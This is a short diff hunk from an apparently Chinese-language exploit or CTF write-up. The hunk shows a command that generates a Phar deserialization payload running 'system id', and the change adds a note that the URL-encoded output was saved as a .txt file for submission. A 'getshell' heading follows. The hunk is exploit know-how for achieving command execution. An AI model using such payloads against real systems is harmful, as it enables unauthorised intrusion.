@@ -392,7 +392,7 @@ file_put_contents($out . '.txt', rawurlencode($data));
 php -d phar.readonly=0 make_phar_payload.php system id poc.bin
 ```
 ![](file-20260606123033226.png)
-生成出来的 `poc.bin.txt` 是 URL 编码后的 Phar 二进制，拿它去提交。
+生成出来的 `poc.bin.txt` 是 URL 编码后的 Phar 二进制，拿它去提交。(url后缀有问题，所以换成txt了)
 
 # getshell
 
